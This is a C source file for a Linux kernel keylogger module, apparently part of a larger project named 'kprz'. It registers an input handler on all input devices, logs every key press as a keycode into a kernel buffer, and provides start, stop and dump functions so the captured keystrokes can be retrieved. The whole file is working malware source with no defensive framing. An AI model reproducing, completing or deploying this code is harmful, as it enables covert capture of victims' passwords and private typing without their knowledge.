#include "keylogger.h"
#include <linux/module.h>
#include <linux/input.h>
#include <linux/slab.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/spinlock.h>
#include <linux/uaccess.h>

#define KEYLOG_BUFFER_SIZE 4096

static struct input_handler keylogger_handler;
static int running;
static char keylog_buffer[KEYLOG_BUFFER_SIZE];
static size_t keylog_pos = 0;
static spinlock_t buffer_lock;

static int key_event(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
    unsigned long flags;
    int written;

    if (type == EV_KEY && value == 1) {
        char log_entry[32];
        written = snprintf(log_entry, sizeof(log_entry), "Keycode: %u\n", code);

        spin_lock_irqsave(&buffer_lock, flags);
        if (keylog_pos + written < KEYLOG_BUFFER_SIZE) {
            memcpy(&keylog_buffer[keylog_pos], log_entry, written);
            keylog_pos += written;
        }
        spin_unlock_irqrestore(&buffer_lock, flags);
    }
    return 0;
}

static int keylogger_connect(struct input_handler *handler, struct input_dev *dev, const struct input_device_id *id) {
    struct input_handle *handle;
    handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
    if (!handle)
        return -ENOMEM;

    handle->dev = dev;
    handle->handler = handler;
    handle->name = "kprz_keylogger";

    return input_register_handle(handle) ? : input_open_device(handle);
}

static void keylogger_disconnect(struct input_handle *handle) {
    input_close_device(handle);
    input_unregister_handle(handle);
    kfree(handle);
}

static const struct input_device_id keylogger_ids[] = {
    { .driver_info = 1 },
    { },
};

static struct input_handler keylogger_handler = {
    .event = key_event,
    .connect = keylogger_connect,
    .disconnect = keylogger_disconnect,
    .name = "kprz_keylogger",
    .id_table = keylogger_ids,
};

void start_keylogger(void) {
    if (!running) {
        spin_lock_init(&buffer_lock);
        input_register_handler(&keylogger_handler);
        running = 1;
    }
}

void stop_keylogger(void) {
    if (running) {
        input_unregister_handler(&keylogger_handler);
        running = 0;
    }
}

void get_keylogger_dump(char *dest, size_t *dump_len) {
    unsigned long flags;

    spin_lock_irqsave(&buffer_lock, flags);
    memcpy(dest, keylog_buffer, keylog_pos);
    *dump_len = keylog_pos;
    keylog_pos = 0;
    spin_unlock_irqrestore(&buffer_lock, flags);
}
